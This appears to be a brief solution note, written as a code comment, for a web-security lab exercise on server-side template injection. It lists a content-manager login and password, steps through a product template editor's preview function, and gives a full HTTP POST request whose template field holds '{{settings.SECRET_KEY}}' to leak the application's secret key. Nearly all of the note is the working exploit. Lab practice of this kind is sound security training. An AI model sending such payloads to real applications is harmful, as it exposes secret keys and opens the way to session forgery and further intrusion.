/*

content-manager:C0nt3ntM4n4g3r

1) Head over to a product page and click the "edit template" button

2) Click the preview button

3) POST /product/template?productId=10 HTTP/1.1
URL decode the value of template

4) https://gitbook.seguranca-informatica.pt/fuzzing-and-web/server-side-template-injection-ssti
POST /product/template?productId=10 HTTP/2
csrf=WXOZ2m4OzFPnboSrCcUdTBULqc0NyoaG&template={{settings.SECRET_KEY}}&template-action=preview

*/